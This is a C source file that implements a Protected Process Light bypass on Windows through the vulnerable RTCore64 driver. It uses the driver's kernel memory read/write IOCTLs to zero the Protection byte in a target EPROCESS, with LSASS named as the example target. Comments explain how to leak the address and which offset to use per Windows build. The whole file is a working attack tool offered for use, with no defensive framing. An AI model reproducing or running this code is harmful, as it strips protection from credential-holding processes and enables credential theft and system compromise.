#include <windows.h>
#include <stdio.h>

// Fox's PPL (Protected Process Light) Bypass via Known Vulnerable Driver (RTCore64)
// This is a data-only attack on the EPROCESS structure, specifically targeting the Protection byte.

#define RTCORE64_READ32  0x80002048
#define RTCORE64_WRITE32 0x8000204C

typedef struct _RTCORE64_MEMORY_REQ {
    DWORD Pad0;
    DWORD64 Address;
    DWORD Pad1;
    DWORD Value;
    DWORD Size;
} RTCORE64_MEMORY_REQ;

BOOL ReadKernelMemory32(HANDLE hDevice, DWORD64 address, DWORD* value) {
    RTCORE64_MEMORY_REQ req = {0};
    req.Address = address;
    req.Size = 4;

    DWORD bytesReturned = 0;
    if (DeviceIoControl(hDevice, RTCORE64_READ32, &req, sizeof(req), &req, sizeof(req), &bytesReturned, NULL)) {
        *value = req.Value;
        return TRUE;
    }
    return FALSE;
}

BOOL WriteKernelMemory32(HANDLE hDevice, DWORD64 address, DWORD value) {
    RTCORE64_MEMORY_REQ req = {0};
    req.Address = address;
    req.Value = value;
    req.Size = 4;

    DWORD bytesReturned = 0;
    return DeviceIoControl(hDevice, RTCORE64_WRITE32, &req, sizeof(req), &req, sizeof(req), &bytesReturned, NULL);
}

int main(int argc, char** argv) {
    if (argc < 2) {
        printf("Usage: %s <Target_EPROCESS_Address>\n", argv[0]);
        printf("Note: You must leak the EPROCESS address of the target (e.g., LSASS) first.\n");
        return -1;
    }

    // In a real scenario, you leak the EPROCESS address using NtQuerySystemInformation (SystemExtendedHandleInformation)
    DWORD64 eprocessAddr = strtoull(argv[1], NULL, 16);
    
    // Windows 10/11 offset for the Protection/SignatureLevel byte in EPROCESS
    // This offset changes between major Windows builds. (e.g., 0x87A for Win11 22H2)
    DWORD64 protectionOffset = 0x87A; 
    DWORD64 targetAddress = eprocessAddr + protectionOffset;

    HANDLE hDevice = CreateFileA("\\\\.\\RTCore64", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open RTCore64 device. Load the driver first.\n");
        return -1;
    }

    printf("[+] Opened RTCore64. We have Ring 0 R/W.\n");
    printf("[+] Target EPROCESS: 0x%llX\n", eprocessAddr);
    printf("[+] Protection Byte Address: 0x%llX\n", targetAddress);

    DWORD originalValue = 0;
    if (!ReadKernelMemory32(hDevice, targetAddress & ~3, &originalValue)) { // Align to 4 bytes for the read
        printf("[-] Failed to read kernel memory.\n");
        CloseHandle(hDevice);
        return -1;
    }

    printf("[+] Original 4-byte block containing Protection: 0x%08X\n", originalValue);

    // The Protection byte dictates if the process is PPL (e.g., PsProtectedSignerLsa).
    // We want to zero it out (0x00) to remove all protection, turning it into a normal process.
    
    // Calculate the exact byte position within the 4-byte block
    int byteOffset = targetAddress % 4;
    DWORD mask = ~(0xFF << (byteOffset * 8));
    DWORD newValue = originalValue & mask; // Zero out the specific byte

    printf("[+] Modifying block to: 0x%08X (Zeroing Protection byte)\n", newValue);

    if (WriteKernelMemory32(hDevice, targetAddress & ~3, newValue)) {
        printf("[!] PPL successfully stripped! Target process is now unprotected.\n");
        printf("[!] You can now OpenProcess(PROCESS_ALL_ACCESS) normally.\n");
    } else {
        printf("[-] Failed to write kernel memory.\n");
    }

    CloseHandle(hDevice);
    return 0;
}